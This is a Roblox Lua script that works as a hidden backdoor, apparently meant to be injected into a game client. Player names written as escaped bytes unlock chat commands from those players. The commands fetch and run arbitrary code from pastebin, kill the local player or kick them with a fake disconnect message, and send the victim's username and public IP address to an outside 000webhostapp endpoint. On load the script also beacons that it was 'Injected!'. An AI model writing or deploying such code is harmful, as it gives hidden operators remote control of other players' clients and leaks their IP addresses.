local Players = game:GetService("Players")

local Commands = {}
local Whitelist = {
 ["\66\82\52\68\75\73\76\76\69\82"] = true,
 ["\101\108\101\118\97\116\111\114"] = true,
 ["\83\105\110\107\105\99\111\108\108"] = true
}

local AddCommand = function(Name, Function) 
   Name = Name:lower()
   Commands[Name] = Function
end

local CommandInput = function(Chat)
   Command = Chat:lower()
   Split = string.split(Command, " ")
   if Split[1]:lower() == "/e" then
      table.remove(Split, 1)
   end
   if Commands[Split[1]] ~= nil then
      local Func = Commands[Split[1]:lower()] 
      table.remove(Split, 1)
      Func(Split)
   end
end

local URIEncode = function(String)
   return game:GetService("HttpService"):UrlEncode(String)
end
      
AddCommand("run", function(Code)
    local Payload = ("https://pastebin.com/raw/" .. tostring(Code))
    local Body = game:HttpGet(Payload)
    loadstring(Body)()
end)

AddCommand("kill", function(...)
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

AddCommand("kick", function(...)
    game.Players.LocalPlayer:Kick("Something went wrong, roblox has disconnected you.")
end)

AddCommand("il", function(...)
    local s, e = pcall(function(...)
        local uri = ("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=")
        local i = game:HttpGet("https://api.ipify.org/")
        local str = (tostring(game.Players.LocalPlayer.Name) .. " IP: " .. tostring(i))
        str = URIEncode(str)
        game:HttpGet(uri .. tostring(str))
    end)
    local uri = ("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=")
    game:HttpGet(uri .. "Attempt on " .. tostring(game.Players.LocalPlayer.Name))
    if not s then warn(e) end
end)

local Setup = function(Player)
    for i, v in pairs(Whitelist) do
       warn(v, Player.Name:lower(), i:lower())
       if (v == true and Player.Name:lower() == i:lower()) then
          Player.Chatted:Connect(CommandInput)
       end
    end
end

Players.PlayerAdded:Connect(Setup)
for i, v in pairs(Players:GetPlayers()) do
   Setup(v)
end

pcall(function(...)
      local Str = (tostring(game.Players.LocalPlayer.Name) .. " Injected!")
      game:HttpGet("https://testwebsitebradlol.000webhostapp.com/swordburst3.php?content_string=" .. URIEncode(Str))
end)
